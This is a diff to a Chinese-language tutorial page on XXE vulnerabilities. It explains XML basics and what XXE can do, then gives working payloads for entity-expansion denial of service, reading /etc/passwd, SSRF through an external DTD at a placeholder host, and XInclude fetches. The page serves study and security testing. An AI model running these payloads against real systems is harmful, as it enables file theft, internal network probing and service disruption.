@@ -1,8 +1,71 @@
 XXE
-================================
+======================================
 
-常见payload
+XML基础
+--------------------------------------
+XML 指可扩展标记语言（eXtensible Markup Language），是一种用于标记电子文件使其具有结构性的标记语言，被设计用来传输和存储数据。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。目前，XML文件作为配置文件（Spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）应用比较广泛。
+
+
+XXE
+--------------------------------------
+当允许引用外部实体时，可通过构造恶意的XML内容，导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等后果。一般的XXE攻击，只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，但是也可以通过Blind XXE的方式实现攻击。
+
+
+攻击方式
+--------------------------------------
+
+拒绝服务攻击
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 ::
 
-    <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+    <!DOCTYPE data [
+    <!ELEMENT data (#ANY)>
+    <!ENTITY a0 "dos" >
+    <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;">
+    <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;">
+    ]>
+    <data>&a2;</data>
+
+若解析过程非常缓慢，则表示测试成功，目标站点可能有拒绝服务漏洞。
+具体攻击可使用更多层的迭代或递归，也可引用巨大的外部实体，以实现攻击的效果。
+
+
+一般XXE攻击
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+::
+
+    <?xml version="1.0"?>
+    <!DOCTYPE data [
+    <!ELEMENT data (#ANY)>
+    <!ENTITY file SYSTEM "file:///etc/passwd">
+    ]>
+    <data>&file;</data>
+
+SSRF
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+::
+
+    <?xml version="1.0"?>
+    <!DOCTYPE data SYSTEM "http://publicServer.com/" [
+    <!ELEMENT data (#ANY)>
+    ]>
+    <data>4</data>
+
+XInclude
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+::
+
+    <?xml version='1.0'?>
+    <data xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://publicServer.com/file.xml"></xi:include></data>
+
+
+参考链接
+--------------------------------------
+
+- `XML教程 <http://www.w3school.com.cn/xml/>`_
+- `未知攻焉知防 XXE漏洞攻防 <https://security.tencent.com/index.php/blog/msg/69>`_
+- `XXE 攻击笔记分享 <http://www.freebuf.com/articles/web/97833.html>`_
